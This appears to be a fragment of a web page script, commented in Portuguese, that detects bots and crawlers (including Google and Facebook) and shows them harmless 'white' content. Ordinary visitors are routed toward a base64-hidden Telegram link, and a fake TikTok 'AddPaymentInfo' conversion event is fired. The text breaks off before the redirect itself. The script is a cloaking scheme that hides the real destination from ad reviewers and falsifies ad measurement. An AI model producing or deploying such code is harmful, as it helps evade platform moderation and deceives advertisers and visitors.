  <script>
    const isBot = () => {
      const n = navigator;
      return (
        n.webdriver ||
        !n.languages ||
        n.languages.length === 0 ||
        !n.plugins ||
        n.plugins.length === 0 ||
        /bot|crawl|spider|facebook|google|Headless|PhantomJS/i.test(n.userAgent)
      );
    };

    const destino = atob("aHR0cHM6Ly90Lm1lL29jdWx0aW5ob3NmcmVl"); // Telegram redirecionamento

    if (isBot()) {
      document.getElementById("white-content").style.display = "block";
    } else {
      // Espera o pixel carregar antes de disparar o evento
      function aguardaPixelETrigaEvento(tentativas) {
        if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
          ttq.track('AddPaymentInfo');
        } else if (tentativas < 10) {
          setTimeout(function () {
            aguardaPixelETrigaEvento(tentativas + 1);
          }, 300);
        }
      }

      setTimeout(function () {
        aguardaPixelETrigaEvento(0);
      }, 1000); // espera 1s para começar a checar o pixel
